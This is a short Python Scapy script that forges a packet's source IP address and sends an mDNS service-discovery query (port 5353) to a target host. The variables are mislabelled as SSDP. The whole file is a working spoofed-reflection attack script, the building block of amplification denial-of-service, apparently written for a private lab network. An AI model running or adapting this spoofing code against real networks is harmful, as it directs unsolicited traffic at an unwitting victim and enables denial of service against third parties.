from scapy.all import *

spoofedIPsrc="192.168.123.3"
SSDPserver="192.168.123.18"

payload='\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\t_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01'
ssdpRequest = IP(src=spoofedIPsrc,dst=SSDPserver) / UDP(sport=5353, dport=5353) / payload
sr1(ssdpRequest)
